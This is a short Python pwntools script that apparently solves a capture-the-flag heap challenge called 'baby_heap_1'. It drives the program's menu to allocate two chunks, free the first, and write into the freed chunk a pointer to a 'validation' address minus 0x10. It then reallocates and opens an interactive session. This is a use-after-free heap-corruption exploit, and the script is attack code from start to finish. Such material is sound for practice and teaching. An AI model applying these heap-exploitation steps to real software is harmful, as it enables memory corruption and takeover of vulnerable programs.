#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
p = process("./baby_heap_1")
gdb.attach(p)
elf = ELF("./baby_heap_1")
validation = 0x6020a8

def add(size):
    p.sendlineafter("> ", '1')
    p.sendlineafter("Size: ", str(size))

def delete(index):
    p.sendlineafter("> ", '2')
    p.sendlineafter("idx: ", str(index))

def read(index, data):
    p.sendlineafter("> ", '3')
    p.sendlineafter("idx: ", str(index))
    p.sendlineafter("data: ", data)


add(0x80)
add(0x1e0)

delete(0)

pay = p64(validation-0x10)
read(0, pay)

add(0x80)

p.interactive()
